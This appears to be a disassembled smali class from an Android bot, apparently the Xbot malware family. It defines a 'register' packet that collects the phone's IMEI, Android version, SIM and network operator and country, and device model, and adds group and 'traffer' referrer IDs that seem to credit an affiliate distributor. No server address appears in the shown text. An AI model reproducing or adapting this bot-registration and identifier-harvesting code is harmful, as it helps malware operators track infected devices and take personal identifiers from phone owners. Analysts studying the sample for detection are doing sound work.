.class public Lcom/xbot/core/network/packets/Register;
.super Lcom/xbot/core/network/Packet;
.source "Register.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/xbot/core/network/packets/Register$Answer;
    }
.end annotation


# instance fields
.field public group_id:I

.field public imei:Ljava/lang/String;

.field public note:Ljava/lang/String;

.field public os:Ljava/lang/String;

.field public os_version:Ljava/lang/String;

.field public phone_model:Ljava/lang/String;

.field public reffer_id:I

.field public sim_country:Ljava/lang/String;

.field public sim_current_country:Ljava/lang/String;

.field public sim_current_operator:Ljava/lang/String;

.field public sim_operator:Ljava/lang/String;

.field public version:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 5

    .prologue
    const/4 v4, 0x0

    const/4 v3, 0x0

    .line 35
    invoke-direct {p0}, Lcom/xbot/core/network/Packet;-><init>()V

    .line 21
    iput-object v3, p0, Lcom/xbot/core/network/packets/Register;->imei:Ljava/lang/String;

    .line 22
    iput-object v3, p0, Lcom/xbot/core/network/packets/Register;->os:Ljava/lang/String;

    .line 23
    iput-object v3, p0, Lcom/xbot/core/network/packets/Register;->os_version:Ljava/lang/String;

    .line 24
    const-string v2, "blabla"

    iput-object v2, p0, Lcom/xbot/core/network/packets/Register;->phone_model:Ljava/lang/String;

    .line 25
    iput-object v3, p0, Lcom/xbot/core/network/packets/Register;->sim_country:Ljava/lang/String;

    .line 26
    iput-object v3, p0, Lcom/xbot/core/network/packets/Register;->sim_operator:Ljava/lang/String;

    .line 27
    iput-object v3, p0, Lcom/xbot/core/network/packets/Register;->sim_current_country:Ljava/lang/String;

    .line 28
    iput-object v3, p0, Lcom/xbot/core/network/packets/Register;->sim_current_operator:Ljava/lang/String;

    .line 29
    iput v4, p0, Lcom/xbot/core/network/packets/Register;->group_id:I

    .line 30
    iput v4, p0, Lcom/xbot/core/network/packets/Register;->reffer_id:I

    .line 31
    const-string v2, ""

    iput-object v2, p0, Lcom/xbot/core/network/packets/Register;->note:Ljava/lang/String;

    .line 32
    sget-object v2, Lcom/xbot/core/Consts;->version:Ljava/lang/String;

    iput-object v2, p0, Lcom/xbot/core/network/packets/Register;->version:Ljava/lang/String;

    .line 36
    const-string v2, "register"

    invoke-virtual {p0, v2}, Lcom/xbot/core/network/packets/Register;->init(Ljava/lang/String;)V

    .line 37
    invoke-static {}, Lcom/xbot/core/RunService;->getService()Lcom/xbot/core/RunService;

    move-result-object v1

    .line 38
    .local v1, "s":Lcom/xbot/core/RunService;
    invoke-virtual {v1}, Lcom/xbot/core/RunService;->getAPI()Lcom/xbot/core/xAPI;

    move-result-object v0

    .line 39
    .local v0, "api":Lcom/xbot/core/xAPI;
    invoke-virtual {v0}, Lcom/xbot/core/xAPI;->getTelephonyInfo()[Ljava/lang/String;

    move-result-object v2

    aget-object v2, v2, v4

    iput-object v2, p0, Lcom/xbot/core/network/packets/Register;->imei:Ljava/lang/String;

    .line 41
    const-string v2, "android"

    iput-object v2, p0, Lcom/xbot/core/network/packets/Register;->os:Ljava/lang/String;

    .line 42
    invoke-virtual {v0}, Lcom/xbot/core/xAPI;->getAndroidVersion()Ljava/lang/String;

    move-result-object v2

    iput-object v2, p0, Lcom/xbot/core/network/packets/Register;->os_version:Ljava/lang/String;

    .line 43
    invoke-virtual {v0}, Lcom/xbot/core/xAPI;->getTelephonyInfo()[Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x5

    aget-object v2, v2, v3

    iput-object v2, p0, Lcom/xbot/core/network/packets/Register;->sim_country:Ljava/lang/String;

    .line 44
    invoke-virtual {v0}, Lcom/xbot/core/xAPI;->getTelephonyInfo()[Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x4

    aget-object v2, v2, v3

    iput-object v2, p0, Lcom/xbot/core/network/packets/Register;->sim_operator:Ljava/lang/String;

    .line 45
    invoke-virtual {v0}, Lcom/xbot/core/xAPI;->getTelephonyInfo()[Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x3

    aget-object v2, v2, v3

    iput-object v2, p0, Lcom/xbot/core/network/packets/Register;->sim_current_country:Ljava/lang/String;

    .line 46
    invoke-virtual {v0}, Lcom/xbot/core/xAPI;->getTelephonyInfo()[Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x2

    aget-object v2, v2, v3

    iput-object v2, p0, Lcom/xbot/core/network/packets/Register;->sim_current_operator:Ljava/lang/String;

    .line 47
    sget v2, Lcom/xbot/core/Consts;->groupName:I

    iput v2, p0, Lcom/xbot/core/network/packets/Register;->group_id:I

    .line 48
    sget v2, Lcom/xbot/core/Consts;->trafferName:I

    iput v2, p0, Lcom/xbot/core/network/packets/Register;->reffer_id:I

    .line 49
    invoke-static {}, Lcom/xbot/core/tools/DeviceName;->getDeviceName()Ljava/lang/String;

    move-result-object v2

    iput-object v2, p0, Lcom/xbot/core/network/packets/Register;->phone_model:Ljava/lang/String;

    .line 50
    return-void
.end method
